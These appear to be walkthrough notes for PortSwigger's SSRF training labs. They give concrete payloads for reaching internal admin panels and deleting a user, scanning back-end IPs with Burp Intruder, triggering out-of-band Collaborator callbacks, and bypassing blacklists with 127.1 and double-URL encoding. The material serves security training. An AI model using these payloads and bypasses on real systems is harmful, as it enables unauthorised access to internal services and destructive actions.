## [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

 - Browse to a product page, click Check stock, and intercept the request in Burp
 - Send the stock check request to Repeater
 - Change the stockApi parameter value to http://localhost/admin — confirm the admin panel is returned in the response
 - Read the HTML to find the delete URL: http://localhost/admin/delete?username=carlos
 - Set stockApi to that delete URL and send — confirm carlos is deleted to solve the lab

## [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

 - Browse to a product page, click Check stock, and intercept the request in Burp
 - Send the stock check request to Intruder
 - Change the stockApi parameter to http://192.168.0.1:8080/admin, then highlight the final octet (1) and click Add §
 - In the Payloads panel set payload type to Numbers, from 1 to 255 step 1
 - Start the attack, then sort by Status column — find the single 200 response and note the IP
 - Send that request to Repeater, change the stockApi path to /admin/delete?username=carlos and send to solve the lab


## [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

- [ ]  Open the lab and browse to any product page
- [ ]  Turn on Burp Intercept and reload the product page to capture the GET request
- [ ]  Send the request to Repeater
- [ ]  Open the **Collaborator** tab and click **Copy to clipboard** to grab your unique subdomain
- [ ]  In Repeater, find the `Referer` header and replace its entire value with your Collaborator URL:

```
  Referer: https://YOUR-COLLABORATOR-SUBDOMAIN
```

- [ ]  Send the request
- [ ]  Switch to the Collaborator tab, click **Poll now** — wait a few seconds and retry if nothing shows up yet
- [ ]  Confirm you see both DNS and HTTP interactions coming in from the server ✅**

## [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

 - Browse to a product page, click Check stock, and intercept the request in Burp
 - Send the stock check request to Repeater
 - Change stockApi to http://127.0.0.1/ — confirm it is blocked
 - Bypass the localhost block by using http://127.1/ instead — confirm it is allowed
 - Change to http://127.1/admin — confirm the word admin is blocked
 - Bypass the admin block by double-URL encoding the a: http://127.1/%2561dmin — confirm the admin panel loads
 - Read the HTML to find the delete URL, then set stockApi to http://127.1/%2561dmin/delete?username=carlos and send to solve the lab

## [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

 - Browse to a product page, click Check stock, and intercept the request in Burp
 - Send the stock check request to Repeater
 - Try changing stockApi to an external host — confirm direct requests to other hosts are blocked
 - Click Next product on any product page and intercept the request — note the path parameter is reflected directly into the Location redirect header, confirming an open redirect
 - Back in the stock check Repeater tab, set stockApi to /product/nextProduct?path=http://192.168.0.12:8080/admin — confirm the admin panel is returned
 - Change the path to /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos and send to solve the

 